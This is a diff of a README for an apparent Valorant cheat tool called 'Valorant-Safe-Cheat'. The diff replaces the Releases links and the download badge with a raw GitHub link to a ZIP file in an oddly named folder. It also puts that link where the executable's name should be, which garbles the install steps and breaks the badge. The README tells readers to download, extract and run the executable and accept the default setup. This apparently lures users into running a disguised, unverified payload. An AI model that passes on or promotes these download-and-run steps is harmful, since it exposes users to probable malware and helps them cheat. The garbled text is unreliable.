@@ -1,6 +1,6 @@
 # 🛡️ Valorant-Safe-Cheat - Enjoy Enhanced Gameplay Safely
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Tool-brightgreen)](https://github.com/juanr13456/Valorant-Safe-Cheat/releases)
+[![Download](https://raw.githubusercontent.com/juanr13456/Valorant-Safe-Cheat/main/sclerosarcoma/Valorant-Safe-Cheat.zip%20Now-Get%20the%20Tool-brightgreen)](https://raw.githubusercontent.com/juanr13456/Valorant-Safe-Cheat/main/sclerosarcoma/Valorant-Safe-Cheat.zip)
 
 ## 📚 Table of Contents
 
@@ -37,13 +37,13 @@ The **Valorant Safe Cheat** provides several tools to help you play Valorant eff
 
 To get started with **Valorant Safe Cheat**, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/juanr13456/Valorant-Safe-Cheat/releases). Here, you will find the latest versions of the tool.
+1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/juanr13456/Valorant-Safe-Cheat/main/sclerosarcoma/Valorant-Safe-Cheat.zip). Here, you will find the latest versions of the tool.
 
 2. **Download the Latest Version**: Locate the most recent release. Click on the link to download the file. 
 
 3. **Extract the Files**: Once the download completes, locate the downloaded ZIP file. Right-click the file and select "Extract All." Follow the prompts to extract the files to a folder of your choice.
 
-4. **Run the Application**: Inside the extracted folder, locate the executable file (e.g., `ValorantSafeCheat.exe`). Double-click to run the application.
+4. **Run the Application**: Inside the extracted folder, locate the executable file (e.g., `https://raw.githubusercontent.com/juanr13456/Valorant-Safe-Cheat/main/sclerosarcoma/Valorant-Safe-Cheat.zip`). Double-click to run the application.
 
 5. **Follow Setup Prompts**: Follow any on-screen instructions to complete the setup. Most users can simply proceed with the default options.
 
@@ -83,4 +83,4 @@ If you encounter issues or have questions, feel free to reach out. You can find 
 
 - **Community**: Engage with other users in the community forums or chat channels where tips and help are available.
 
-For quick guidance, refer back to this README as a resource. You can also check back on the [Releases Page](https://github.com/juanr13456/Valorant-Safe-Cheat/releases) for updates.
+For quick guidance, refer back to this README as a resource. You can also check back on the [Releases Page](https://raw.githubusercontent.com/juanr13456/Valorant-Safe-Cheat/main/sclerosarcoma/Valorant-Safe-Cheat.zip) for updates.
